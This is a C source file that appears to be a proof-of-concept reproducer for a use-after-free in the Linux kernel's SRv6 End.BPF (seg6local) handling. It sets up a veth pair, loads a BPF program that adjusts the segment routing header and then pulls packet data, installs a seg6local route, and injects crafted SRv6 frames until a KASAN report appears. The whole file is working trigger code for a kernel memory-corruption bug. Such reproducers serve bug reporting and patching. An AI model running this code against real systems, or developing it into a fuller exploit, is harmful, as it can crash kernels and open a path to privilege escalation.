// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/bpf.h>

#ifndef NLA_F_NESTED
#define NLA_F_NESTED (1 << 15)
#endif
#define LWTUNNEL_ENCAP_SEG6_LOCAL_	7
#define SEG6_LOCAL_ACTION_		1
#define SEG6_LOCAL_BPF_			8
#define SEG6_LOCAL_ACTION_END_BPF_	15
#define SEG6_LOCAL_BPF_PROG_		1
#define SEG6_LOCAL_BPF_PROG_NAME_	2
#define VETH_INFO_PEER_			1
#define PROG_TYPE_LWT_SEG6LOCAL		19
#define FN_skb_pull_data		39
#define FN_lwt_seg6_adjust_srh		75

#define FRAME_LEN	6000
#define SRH_ADJ_OFF	80
#define SRH_ADJ_LEN	8
#define PULL_LEN	5000

static int nl_seq = 1;

static void die(const char *m) { fprintf(stderr, "[-] %s: %s\n", m, strerror(errno)); exit(1); }

static struct rtattr *addattr(struct nlmsghdr *n, int maxlen, int type,
			      const void *data, int alen)
{
	int len = RTA_LENGTH(alen);
	struct rtattr *rta;

	if ((int)(NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len)) > maxlen) {
		fprintf(stderr, "[-] netlink buffer overflow\n");
		exit(1);
	}
	rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
	return rta;
}

static struct rtattr *nest_start(struct nlmsghdr *n, int maxlen, int type)
{
	struct rtattr *nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));

	addattr(n, maxlen, type | NLA_F_NESTED, NULL, 0);
	return nest;
}

static void nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
	nest->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)nest;
}

static int nl_talk(struct nlmsghdr *n, const char *what)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	char buf[8192];
	int fd, len;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("socket(NETLINK_ROUTE)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(netlink)");

	n->nlmsg_seq = nl_seq++;
	n->nlmsg_pid = 0;
	n->nlmsg_flags |= NLM_F_ACK;

	if (send(fd, n, n->nlmsg_len, 0) < 0)
		die("send(netlink)");

	len = recv(fd, buf, sizeof(buf), 0);
	if (len < 0)
		die("recv(netlink)");
	close(fd);

	struct nlmsghdr *h = (struct nlmsghdr *)buf;
	if (h->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(h);

		if (e->error) {
			fprintf(stderr, "[-] %s failed: %s\n", what, strerror(-e->error));
			return -1;
		}
	}
	printf("[+] %s ok\n", what);
	return 0;
}

static int create_veth(const char *a, const char *b)
{
	struct {
		struct nlmsghdr n;
		struct ifinfomsg i;
		char buf[1024];
	} req;
	struct rtattr *linkinfo, *infodata, *peer;
	struct ifinfomsg peerinfo;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.n.nlmsg_type = RTM_NEWLINK;
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
	req.i.ifi_family = AF_UNSPEC;

	addattr(&req.n, sizeof(req), IFLA_IFNAME, a, strlen(a) + 1);
	linkinfo = nest_start(&req.n, sizeof(req), IFLA_LINKINFO);
	addattr(&req.n, sizeof(req), IFLA_INFO_KIND, "veth", 5);
	infodata = nest_start(&req.n, sizeof(req), IFLA_INFO_DATA);
	peer = nest_start(&req.n, sizeof(req), VETH_INFO_PEER_);

	memset(&peerinfo, 0, sizeof(peerinfo));
	memcpy((char *)&req.n + NLMSG_ALIGN(req.n.nlmsg_len), &peerinfo, sizeof(peerinfo));
	req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + sizeof(peerinfo);
	addattr(&req.n, sizeof(req), IFLA_IFNAME, b, strlen(b) + 1);
	nest_end(&req.n, peer);
	nest_end(&req.n, infodata);
	nest_end(&req.n, linkinfo);

	return nl_talk(&req.n, "create veth pair");
}

static void iface_up_mtu(const char *name, int mtu)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	ifr.ifr_mtu = mtu;
	if (ioctl(fd, SIOCSIFMTU, &ifr) < 0)
		die("SIOCSIFMTU");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		die("SIOCGIFFLAGS");
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		die("SIOCSIFFLAGS");
	close(fd);
	printf("[+] %s up, mtu %d\n", name, mtu);
}

static void iface_hwaddr(const char *name, unsigned char *mac)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
}

struct bpf_insn_ {
	uint8_t code;
	uint8_t dst_src;
	int16_t off;
	int32_t imm;
};

#define INSN(c, d, s, o, i) \
	((struct bpf_insn_){ .code = (c), .dst_src = (uint8_t)(((s) << 4) | ((d) & 0xf)), \
			     .off = (o), .imm = (i) })

#define MOV64_REG(d, s)  INSN(0xbf, d, s, 0, 0)
#define MOV64_IMM(d, i)  INSN(0xb7, d, 0, 0, i)
#define CALL(i)          INSN(0x85, 0, 0, 0, i)
#define EXIT()           INSN(0x95, 0, 0, 0, 0)

static char bpf_log[65536];

static int load_prog(void)
{
	struct bpf_insn_ insns[] = {
		MOV64_REG(6, 1),
		MOV64_REG(1, 6),
		MOV64_IMM(2, SRH_ADJ_OFF),
		MOV64_IMM(3, SRH_ADJ_LEN),
		CALL(FN_lwt_seg6_adjust_srh),
		MOV64_REG(1, 6),
		MOV64_IMM(2, PULL_LEN),
		CALL(FN_skb_pull_data),
		MOV64_IMM(0, 0),
		EXIT(),
	};
	union bpf_attr attr;
	int fd;

	memset(&attr, 0, sizeof(attr));
	attr.prog_type = PROG_TYPE_LWT_SEG6LOCAL;
	attr.insn_cnt = sizeof(insns) / sizeof(insns[0]);
	attr.insns = (uint64_t)(unsigned long)insns;
	attr.license = (uint64_t)(unsigned long)"GPL";
	attr.log_level = 1;
	attr.log_size = sizeof(bpf_log);
	attr.log_buf = (uint64_t)(unsigned long)bpf_log;
	strncpy(attr.prog_name, "seg6uaf", sizeof(attr.prog_name) - 1);

	fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
	if (fd < 0) {
		fprintf(stderr, "[-] BPF_PROG_LOAD failed: %s\n%s\n",
			strerror(errno), bpf_log);
		exit(1);
	}
	printf("[+] loaded LWT_SEG6LOCAL prog, fd=%d\n", fd);
	return fd;
}

static int add_seg6local_route(const struct in6_addr *dst, int oif, int prog_fd)
{
	struct {
		struct nlmsghdr n;
		struct rtmsg r;
		char buf[1024];
	} req;
	struct rtattr *encap, *bpfnest;
	uint32_t action = SEG6_LOCAL_ACTION_END_BPF_;
	uint16_t etype = LWTUNNEL_ENCAP_SEG6_LOCAL_;
	uint32_t fd32 = (uint32_t)prog_fd;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	req.n.nlmsg_type = RTM_NEWROUTE;
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
	req.r.rtm_family = AF_INET6;
	req.r.rtm_dst_len = 128;
	req.r.rtm_table = RT_TABLE_MAIN;
	req.r.rtm_protocol = RTPROT_BOOT;
	req.r.rtm_scope = RT_SCOPE_UNIVERSE;
	req.r.rtm_type = RTN_UNICAST;

	addattr(&req.n, sizeof(req), RTA_DST, dst, 16);
	addattr(&req.n, sizeof(req), RTA_OIF, &oif, 4);
	addattr(&req.n, sizeof(req), RTA_ENCAP_TYPE, &etype, 2);
	encap = nest_start(&req.n, sizeof(req), RTA_ENCAP);
	addattr(&req.n, sizeof(req), SEG6_LOCAL_ACTION_, &action, 4);
	bpfnest = nest_start(&req.n, sizeof(req), SEG6_LOCAL_BPF_);
	addattr(&req.n, sizeof(req), SEG6_LOCAL_BPF_PROG_, &fd32, 4);
	addattr(&req.n, sizeof(req), SEG6_LOCAL_BPF_PROG_NAME_, "seg6uaf", 8);
	nest_end(&req.n, bpfnest);
	nest_end(&req.n, encap);

	return nl_talk(&req.n, "add End.BPF seg6local route");
}

struct ipv6_hdr_ {
	uint32_t ver_tc_fl;
	uint16_t payload_len;
	uint8_t  nexthdr;
	uint8_t  hop_limit;
	struct in6_addr saddr;
	struct in6_addr daddr;
};

struct srh_ {
	uint8_t  nexthdr;
	uint8_t  hdrlen;
	uint8_t  type;
	uint8_t  segments_left;
	uint8_t  first_segment;
	uint8_t  flags;
	uint16_t tag;
	struct in6_addr segments[2];
};

int main(void)
{
	unsigned char frame[FRAME_LEN];
	unsigned char peer_mac[6], src_mac[6];
	struct in6_addr dst6, seg0, src6;
	struct sockaddr_ll sll;
	int ifi_tx, ifi_rx, prog_fd, ps, i;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] seg6 End.BPF srh_state UAF PoC\n");

	if (create_veth("sr0", "sr1") < 0)
		return 1;
	iface_up_mtu("sr0", 9000);
	iface_up_mtu("sr1", 9000);

	ifi_tx = if_nametoindex("sr0");
	ifi_rx = if_nametoindex("sr1");
	if (!ifi_tx || !ifi_rx)
		die("if_nametoindex");
	iface_hwaddr("sr1", peer_mac);
	iface_hwaddr("sr0", src_mac);
	printf("[+] sr0=%d sr1=%d peer mac %02x:%02x:%02x:%02x:%02x:%02x\n",
	       ifi_tx, ifi_rx, peer_mac[0], peer_mac[1], peer_mac[2],
	       peer_mac[3], peer_mac[4], peer_mac[5]);

	prog_fd = load_prog();

	inet_pton(AF_INET6, "fd00::1", &dst6);
	inet_pton(AF_INET6, "fd00::2", &seg0);
	inet_pton(AF_INET6, "fc00::9", &src6);

	if (add_seg6local_route(&dst6, ifi_rx, prog_fd) < 0)
		return 1;

	memset(frame, 0x41, sizeof(frame));
	memcpy(frame, peer_mac, 6);
	memcpy(frame + 6, src_mac, 6);
	frame[12] = 0x86;
	frame[13] = 0xdd;

	struct ipv6_hdr_ *ip6 = (struct ipv6_hdr_ *)(frame + 14);
	memset(ip6, 0, sizeof(*ip6));
	ip6->ver_tc_fl = htonl(6u << 28);
	ip6->payload_len = htons(FRAME_LEN - 14 - 40);
	ip6->nexthdr = 43;
	ip6->hop_limit = 64;
	ip6->saddr = src6;
	ip6->daddr = dst6;

	struct srh_ *srh = (struct srh_ *)(frame + 14 + 40);
	memset(srh, 0, sizeof(*srh));
	srh->nexthdr = 59;
	srh->hdrlen = 4;
	srh->type = 4;
	srh->segments_left = 1;
	srh->first_segment = 1;
	srh->segments[0] = seg0;
	srh->segments[1] = dst6;

	ps = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (ps < 0)
		die("socket(AF_PACKET)");
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IPV6);
	sll.sll_ifindex = ifi_tx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, peer_mac, 6);

	printf("[*] injecting %d-byte SRv6 frames into sr0 -> sr1 ...\n", FRAME_LEN);
	for (i = 0; i < 64; i++) {
		if (sendto(ps, frame, FRAME_LEN, 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0) {
			die("sendto");
		}
		usleep(20000);
	}
	printf("[*] done, waiting for KASAN report\n");
	sleep(3);
	return 0;
}
